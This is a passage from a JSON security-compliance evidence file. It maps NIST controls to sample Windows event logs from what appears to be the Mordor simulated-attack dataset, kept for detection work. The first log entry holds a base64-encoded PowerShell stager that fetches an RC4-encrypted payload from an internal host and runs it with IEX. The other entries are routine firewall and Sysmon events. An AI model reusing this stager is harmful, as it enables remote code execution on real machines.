JwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = 7c68447b-1740-4e09-9a80-6b8d20ac5a84\\r\\n        Pipeline ID = 1\\r\\n        Command Name = Get-Random\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 22716\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\",\"Payload\":\"CommandInvocation(Get-Random): \\\"Get-Random\\\"\\r\\nParameterBinding(Get-Random): name=\\\"InputObject\\\"; value=\\\"/admin/get.php\\\"\\r\\nParameterBinding(Get-Random): name=\\\"InputObject\\\"; value=\\\"/news.php\\\"\\r\\nParameterBinding(Get-Random): name=\\\"InputObject\\\"; value=\\\"/login/process.php\\\"\\r\\n\",\"Domain\":\"THESHIRE\",\"ExecutionProcessID\":1648,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"ActivityID\":\"{22CB5860-CC22-0000-E1F1-358A906BD601}\",\"SeverityValue\":2,\"EventID\":4103,\"UserID\":\"S-1-5-21-1363495622-3806888128-621328882-1104\",\"ProviderGuid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"RecordNumber\":13443,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":0,\"tags\":[\"mordorDataset\"]}"
            ],
            "relevant-evidence": []
          },
          {
            "uuid": "4b111f72-d957-4d1b-814e-aba6b21246ac",
            "description": "NIST Control Capture: SI-4 [Windows Integrity]",
            "methods": [
              "EXAMINE",
              "TEST"
            ],
            "occurrence-count": 4088,
            "sample-evidence": [
              "{\"@version\":\"1\",\"EventType\":\"AUDIT_SUCCESS\",\"Version\":0,\"ThreadID\":6612,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":12810,\"SourcePort\":\"54260\",\"Channel\":\"Security\",\"SourceName\":\"Microsoft-Windows-Security-Auditing\",\"OpcodeValue\":0,\"Hostname\":\"MORDORDC.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.239Z\",\"Message\":\"The Windows Filtering Platform has permitted a bind to a local port.\\r\\n\\r\\nApplication Information:\\r\\n\\tProcess ID:\\t\\t3596\\r\\n\\tApplication Name:\\t\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\dfsrs.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tSource Address:\\t\\t::\\r\\n\\tSource Port:\\t\\t54260\\r\\n\\tProtocol:\\t\\t6\\r\\n\\r\\nFilter Information:\\r\\n\\tFilter Run-Time ID:\\t0\\r\\n\\tLayer Name:\\t\\tResource Assignment\\r\\n\\tLayer Run-Time ID:\\t38\",\"Category\":\"Filtering Platform Connection\",\"Opcode\":\"Info\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"3596\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"Application\":\"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\dfsrs.exe\",\"ExecutionProcessID\":4,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"LayerRTID\":\"38\",\"LayerName\":\"%%14608\",\"SeverityValue\":2,\"EventID\":5158,\"SourceAddress\":\"::\",\"ProviderGuid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"RecordNumber\":765786,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9214364837600034816,\"FilterRTID\":\"0\",\"Protocol\":\"6\",\"tags\":[\"mordorDataset\"]}",
              "{\"tags\":[\"mordorDataset\"],\"@version\":\"1\",\"EventType\":\"AUDIT_SUCCESS\",\"Version\":1,\"ThreadID\":6612,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":12810,\"DestAddress\":\"fe80::3816:b2ee:1b9b:324b\",\"SourcePort\":\"54260\",\"Channel\":\"Security\",\"SourceName\":\"Microsoft-Windows-Security-Auditing\",\"OpcodeValue\":0,\"Hostname\":\"MORDORDC.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.239Z\",\"Message\":\"The Windows Filtering Platform has permitted a connection.\\r\\n\\r\\nApplication Information:\\r\\n\\tProcess ID:\\t\\t3596\\r\\n\\tApplication Name:\\t\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\dfsrs.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tDirection:\\t\\tOutbound\\r\\n\\tSource Address:\\t\\tfe80::3816:b2ee:1b9b:324b\\r\\n\\tSource Port:\\t\\t54260\\r\\n\\tDestination Address:\\tfe80::3816:b2ee:1b9b:324b\\r\\n\\tDestination Port:\\t\\t135\\r\\n\\tProtocol:\\t\\t6\\r\\n\\r\\nFilter Information:\\r\\n\\tFilter Run-Time ID:\\t65853\\r\\n\\tLayer Name:\\t\\tConnect\\r\\n\\tLayer Run-Time ID:\\t50\",\"Category\":\"Filtering Platform Connection\",\"Opcode\":\"Info\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"3596\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"Application\":\"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\dfsrs.exe\",\"ExecutionProcessID\":4,\"Direction\":\"%%14593\",\"RemoteMachineID\":\"S-1-0-0\",\"host\":\"wec.internal.cloudapp.net\",\"DestPort\":\"135\",\"Severity\":\"INFO\",\"LayerRTID\":\"50\",\"LayerName\":\"%%14611\",\"SeverityValue\":2,\"EventID\":5156,\"SourceAddress\":\"fe80::3816:b2ee:1b9b:324b\",\"ProviderGuid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"RecordNumber\":765787,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9214364837600034816,\"FilterRTID\":\"65853\",\"Protocol\":\"6\",\"RemoteUserID\":\"S-1-0-0\"}",
              "{\"tags\":[\"mordorDataset\"],\"@version\":\"1\",\"EventType\":\"AUDIT_SUCCESS\",\"Version\":1,\"ThreadID\":6612,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":12810,\"DestAddress\":\"fe80::3816:b2ee:1b9b:324b\",\"SourcePort\":\"54260\",\"Channel\":\"Security\",\"SourceName\":\"Microsoft-Windows-Security-Auditing\",\"OpcodeValue\":0,\"Hostname\":\"MORDORDC.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.239Z\",\"Message\":\"The Windows Filtering Platform has permitted a connection.\\r\\n\\r\\nApplication Information:\\r\\n\\tProcess ID:\\t\\t976\\r\\n\\tApplication Name:\\t\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\svchost.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tDirection:\\t\\tInbound\\r\\n\\tSource Address:\\t\\tfe80::3816:b2ee:1b9b:324b\\r\\n\\tSource Port:\\t\\t54260\\r\\n\\tDestination Address:\\tfe80::3816:b2ee:1b9b:324b\\r\\n\\tDestination Port:\\t\\t135\\r\\n\\tProtocol:\\t\\t6\\r\\n\\r\\nFilter Information:\\r\\n\\tFilter Run-Time ID:\\t65851\\r\\n\\tLayer Name:\\t\\tReceive/Accept\\r\\n\\tLayer Run-Time ID:\\t46\",\"Category\":\"Filtering Platform Connection\",\"Opcode\":\"Info\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"976\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"Application\":\"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\svchost.exe\",\"ExecutionProcessID\":4,\"Direction\":\"%%14592\",\"RemoteMachineID\":\"S-1-0-0\",\"host\":\"wec.internal.cloudapp.net\",\"DestPort\":\"135\",\"Severity\":\"INFO\",\"LayerRTID\":\"46\",\"LayerName\":\"%%14610\",\"SeverityValue\":2,\"EventID\":5156,\"SourceAddress\":\"fe80::3816:b2ee:1b9b:324b\",\"ProviderGuid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"RecordNumber\":765788,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9214364837600034816,\"FilterRTID\":\"65851\",\"Protocol\":\"6\",\"RemoteUserID\":\"S-1-0-0\"}",
              "{\"@version\":\"1\",\"EventType\":\"AUDIT_SUCCESS\",\"Version\":0,\"ThreadID\":6612,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":12810,\"SourcePort\":\"54261\",\"Channel\":\"Security\",\"SourceName\":\"Microsoft-Windows-Security-Auditing\",\"OpcodeValue\":0,\"Hostname\":\"MORDORDC.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.239Z\",\"Message\":\"The Windows Filtering Platform has permitted a bind to a local port.\\r\\n\\r\\nApplication Information:\\r\\n\\tProcess ID:\\t\\t3596\\r\\n\\tApplication Name:\\t\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\dfsrs.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tSource Address:\\t\\t::\\r\\n\\tSource Port:\\t\\t54261\\r\\n\\tProtocol:\\t\\t6\\r\\n\\r\\nFilter Information:\\r\\n\\tFilter Run-Time ID:\\t0\\r\\n\\tLayer Name:\\t\\tResource Assignment\\r\\n\\tLayer Run-Time ID:\\t38\",\"Category\":\"Filtering Platform Connection\",\"Opcode\":\"Info\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"3596\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"Application\":\"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\dfsrs.exe\",\"ExecutionProcessID\":4,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"LayerRTID\":\"38\",\"LayerName\":\"%%14608\",\"SeverityValue\":2,\"EventID\":5158,\"SourceAddress\":\"::\",\"ProviderGuid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"RecordNumber\":765789,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9214364837600034816,\"FilterRTID\":\"0\",\"Protocol\":\"6\",\"tags\":[\"mordorDataset\"]}",
              "{\"tags\":[\"mordorDataset\"],\"@version\":\"1\",\"EventType\":\"CreateKey\",\"Version\":2,\"ThreadID\":4208,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":12,\"AccountType\":\"User\",\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"EventTypeOrignal\":\"INFO\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"Hostname\":\"MORDORDC.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.239Z\",\"OpcodeValue\":0,\"Message\":\"Registry object added or deleted:\\r\\nRuleName: -\\r\\nEventType: CreateKey\\r\\nUtcTime: 2020-08-07 14:39:12.918\\r\\nProcessGuid: {9f85ce58-59d8-5f2b-0c00-000000000400}\\r\\nProcessId: 704\\r\\nImage: C:\\\\windows\\\\system32\\\\lsass.exe\\r\\nTargetObject: HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"704\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"AccountName\":\"SYSTEM\",\"UtcTime\":\"2020-08-07 14:39:12.918\",\"Domain\":\"NT AUTHORITY\",\"ExecutionProcessID\":3888,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"TargetObject\":\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\",\"SeverityValue\":2,\"EventID\":12,\"UserID\":\"S-1-5-18\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":757464,\"Image\":\"C:\\\\windows\\\\system32\\\\lsass.exe\",\"Keywords\":-9223372036854775808,\"ProcessGuid\":\"{9f85ce58-59d8-5f2b-0c00-000000000400}\",\"SourceModuleType\":\"im_msvistalog\",\"RuleName\":\"-\"}",
              "{\"tags\":[\"mordorDataset\"],\"@version\":\"1\",\"EventType\":\"AUDIT_SUCCESS\",\"Version\":1,\"ThreadID\":4316,\"EventTime\":\"2020-08-07 10:42:06\",\"Task\":12810,\"DestAddress\":\"169.254.169.254\",\"SourcePort\":\"52810\",\"Channel\":\"Security\",\"SourceName\":\"Microsoft-Windows-Security-Auditing\",\"OpcodeValue\":0,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:42:09.192Z\",\"Message\":\"The Windows Filtering Platform has permitted a connection.\\r\\n\\r\\nApplication Information:\\r\\n\\tProcess ID:\\t\\t3472\\r\\n\\tApplication Name:\\t\\\\device\\\\harddiskvolume2\\\\packages\\\\plugins\\\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\\\1.4.1587.1\\\\networkwatcheragent\\\\networkwatcheragent.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tDirection:\\t\\tOutbound\\r\\n\\tSource Address:\\t\\t172.18.39.5\\r\\n\\tSource Port:\\t\\t52810\\r\\n\\tDestination Address:\\t169.254.169.254\\r\\n\\tDestination Port:\\t\\t80\\r\\n\\tProtocol:\\t\\t6\\r\\n\\r\\nFilter Information:\\r\\n\\tFilter Run-Time ID:\\t69424\\r\\n\\tLayer Name:\\t\\tConnect\\r\\n\\tLayer Run-Time ID:\\t48\",\"Category\":\"Filtering Platform Connection\",\"Opcode\":\"Info\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"3472\",\"EventReceivedTime\":\"2020-08-07 10:42:09\",\"port\":60122,\"Application\":\"\\\\device\\\\harddiskvolume2\\\\packages\\\\plugins\\\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\\\1.4.1587.1\\\\networkwatcheragent\\\\networkwatcheragent.exe\",\"ExecutionProcessID\":4,\"Direction\":\"%%14593\",\"RemoteMachineID\":\"S-1-0-0\",\"host\":\"wec.internal.cloudapp.net\",\"DestPort\":\"80\",\"Severity\":\"INFO\",\"LayerRTID\":\"48\",\"LayerName\":\"%%14611\",\"SeverityValue\":2,\"EventID\":5156,\"SourceAddress\":\"172.18.39.5\",\"ProviderGuid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"RecordNumber\":203049,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9214364837600034816,\"FilterRTID\":\"69424\",\"Protocol\":\"6\",\"RemoteUserID\":\"S-1-0-0\"}",
